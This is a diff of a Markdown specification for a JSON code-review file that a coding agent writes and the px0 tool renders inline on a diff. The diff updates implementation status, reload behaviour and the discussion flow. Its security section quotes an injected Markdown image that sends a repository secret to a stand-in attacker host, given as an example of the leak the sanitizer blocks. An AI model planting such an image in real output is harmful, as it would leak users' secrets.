@@ -1,6 +1,6 @@
 # Review File Specification (`px0.review` v1)
 
-> **Status: proposed. Not implemented.** This is the contract between a coding agent that reviews code and px0, which displays that review. It accompanies [Local Review](local-review.md). Nothing in this document exists in the binary yet.
+> **Status: implemented, except the items listed under [Implementation notes](#implementation-notes).** This is the contract between a coding agent that reviews code and px0, which displays that review. It accompanies [Local Review](local-review.md). The loader and validator are in [`review.go`](../../review.go), the embedded schema in [`review.schema.json`](../../review.schema.json) (printed by `px0 -review-schema`), and the rendering in [`web/src/review.js`](../../web/src/review.js).
 
 A review file is a UTF-8 JSON document that an agent writes after reviewing a branch or pull request. `px0 -review <file>` reads it and shows each comment inline on the diff, with a panel, a summary, and a "Discuss" action that opens a px0 [thread](threads.md) about the comment.
 
@@ -49,7 +49,7 @@ A suggested replacement uses GitHub's convention inside `body`: a fenced block w
 
 `{ rev?, path, line?, endLine?, label? }`
 
-- `rev` defaults to `head`. px0 resolves it with `git rev-parse --verify --end-of-options <rev>^{commit}`. If that fails the ref is marked `unresolved`; the comment still shows.
+- `rev` defaults to `head`. px0 rejects a `rev` that starts with `-` and resolves any other with `git rev-parse --verify <rev>^{commit}`. If that fails the ref is marked `unresolved`; the comment still shows. *(Not implemented yet: refs are validated and listed under the comment, but not resolved. See the implementation notes.)*
 - `path` is sandboxed exactly like any other client path (`safePath`).
 - A snippet is at most 80 lines, read with `git show <sha>:<path>` and syntax-highlighted by the existing highlighter.
 - External URLs are not supported in v1.
@@ -76,9 +76,10 @@ Computed by px0 for each comment. They are never stored in the file.
 | `moved` | `anchor` matched at a different line; px0 records the new position. |
 | `unanchored` | `anchor` could not be located; the comment is shown at file level with its original line noted. |
 | `unverified` | No `anchor` was given; only bounds-checked. |
-| `outsideDiff` | The file is in `head` but not part of the diff. |
 | `out_of_range` | `line` is past the end of the file. |
 | `unresolved` | (refs only) the `rev` or `path` could not be resolved. |
+
+`outsideDiff` is a separate flag on the comment, not a status: a file that is in `head` but not touched by the diff keeps whatever status its anchor check gave it.
 
 ## 6. Anchor verification, relocation and staleness
 
@@ -96,16 +97,18 @@ Models are often off by a few lines when counting, so agents SHOULD always send 
 
 - Render Markdown only through the existing escape-first / allowlist sanitizer (`web/src/markdown.js`). Raw HTML is never inserted.
 - **Never load images.** px0's CSP allows `img-src https: http:` (see [architecture §5](architecture.md)), so an injected `![](https://evil.example/?d=<secret from the repo>)` would send data out the moment the comment rendered. An image is shown as a plain link.
-- Allow only `http(s)` and relative links, never `javascript:` or `data:`; open links with `rel="noopener noreferrer"`.
+- Make only `http(s)` links, never `javascript:` or `data:`; open them with `rel="noopener noreferrer"`. A relative link is shown as plain text.
 - Treat the review as a claim to check, not a fact, when passing it to a harness (§9).
 
 ## 8. Lifecycle and transport
 
-- `px0 -review <file>` reads the file once at startup, then again whenever its mtime or size changes (checked while the tab is visible; no timers when it is hidden). `-review -` reads stdin once and never reloads.
+- `px0 -review <file>` reads the file at startup, then again whenever its mtime or size changes. The change is noticed when the browser asks for `/api/review`, which it does when the tab gains focus or becomes visible, and while the first check against the code is still running; there are no timers while the tab is hidden. `-review -` reads stdin once and never reloads.
+- Comments are shown only once they have been checked against the code, so a comment that is about to be rejected never flashes up. On a reload the previously checked comments stay on screen until the new file has been checked.
+- If a rewritten file no longer parses, px0 keeps showing the last review that loaded and says so in a banner.
 - Agents SHOULD write atomically: write a temp file in the same directory, then `rename` it over the target.
 - Comments may be added, changed or removed between reads. Stable `id`s keep UI state attached to the right comment.
-- User triage (open / accepted / dismissed) is stored in px0's session store under the user's config directory, never in the file and never in the workspace.
-- px0 exposes `GET /api/review` (the normalised review plus `rejected[]`, `stale`, statuses; ETag from mtime and size) and `GET /api/review/ref?id=&i=`. Both are plain reads with no `localPost` guard. There is no endpoint through which a client can submit comments.
+- px0 exposes `GET /api/review`: the normalised review plus `rejected[]`, `stale`, `resolved` and each comment's computed `kind` and `status`, with an ETag derived from the file's mtime and size. It is a plain read with no `localPost` guard, and `generatedBy.sessionId` is never included. There is no endpoint through which a client can submit or change comments.
+- *(Planned, not implemented: user triage (open / accepted / dismissed) stored in px0's session store, never in the file or the workspace; and `GET /api/review/ref?id=&i=` for reference snippets.)*
 
 ## 9. In-chat discussion
 
@@ -115,7 +118,7 @@ A comment becomes a px0 thread; this is how a reviewer talks to the agent about 
 
 - **Discuss** on a comment calls `POST /api/threads/create {path, l1, l2, message}` with `l1..l2` = `line..endLine`. px0 reads the snippet itself, so the client supplies no file content.
 - `LEFT`-side, file-level and general comments create an unanchored thread. The first message quotes the comment and states which side and line it refers to.
-- The message is prefilled as `Re <id> (<severity>): <body>` and editable before Send.
+- The message is prefilled as `Re <id> (<severity>, <location>):` followed by the comment quoted (first 600 characters), with the cursor left after it for the question. It is editable before Send.
 - The thread's PR scope defaults to `pr`, so the harness also gets the saved diff of the whole review.
 
 ### Context block
@@ -123,14 +126,16 @@ A comment becomes a px0 thread; this is how a reviewer talks to the agent about 
 `prThreadContext` appends this to the first prompt, to a replay, and when the scope changes, as it does for PR context today:
 
 ```text
-This workspace is a local review of <head> against <base> (merge-base <sha12>).
-An automated review exists at <path-to-review-file>: "<title>" - <n> comments
-(<k> blocker, <m> major). Summary: <summary, truncated to 1 KiB>.
-The user is discussing comment <id> (<severity>) at <path>:<line>[-<endLine>]: <body, truncated to 2 KiB>.
-Treat the review as a claim to check against the code, not as ground truth.
+This workspace is a local review of <head> against <base>. [...the usual scope text:
+the exact `git diff <merge-base> <head>`, the saved diff file, the changed files...]
+
+An automated review of this change is loaded in px0: "<title>" (<n> comments, <k> blocker,
+<m> major) written by <agent>. The full review file is <absolute path>. Its summary:
+<summary, truncated to 1 KiB> Treat the review as claims to check against the code, not as
+ground truth; the user may be asking about one of its comments, quoted in their message.
 ```
 
-This baseline works with every harness, because it only needs a file path and some text.
+The comment being discussed travels in the user's message (the prefill above), not in this block, so one block serves every thread about the review. This baseline works with every harness, because it only needs a file path and some text. The path is omitted when the review came from stdin.
 
 ### Optional same-session handoff
 
@@ -138,6 +143,19 @@ This baseline works with every harness, because it only needs a file path and so
 - px0 would have to read the forked session's id from the stream-json `init` event, as the `agy` path already does, and treat it as the thread's session afterwards.
 - Unverified: whether a session can be resumed from a different working directory than the one that created it. If resume fails, px0 falls back to the context block and says so in the thread.
 - Off by default until this has been tested end to end.
+- *(Not implemented. `generatedBy.sessionId` is accepted and kept on the server, but nothing uses it yet.)*
+
+## Implementation notes
+
+What the first implementation does differently from, or not yet, this specification:
+
+- **Refs are listed, not resolved.** `refs` are validated (path, line range, `rev` not starting with `-`) and shown under the comment as `rev:path:line` text. There is no snippet endpoint, no `unresolved` status and no click-through yet.
+- **No session handoff.** `generatedBy.sessionId` is parsed and withheld from the browser, but a thread never resumes or forks that session.
+- **No saved triage.** The panel has no accepted / dismissed state yet.
+- **`outsideDiff` is a flag**, not a status (§5).
+- **Rejections.** Problems that need the code to detect (`path not in head`, `path not in the merge-base`, a reply whose parent was rejected) are found by the background pass, so they are printed to the terminal and shown in the banner a moment after startup, not before the URL is printed.
+- **Revisions.** A revision beginning with `-` is refused before git sees it, rather than relying on `--end-of-options`.
+- **Flag order.** Go's `flag` package stops at the first non-flag argument, so flags come first: `px0 -review review.json <pr-url>`.
 
 ## 10. Example
 
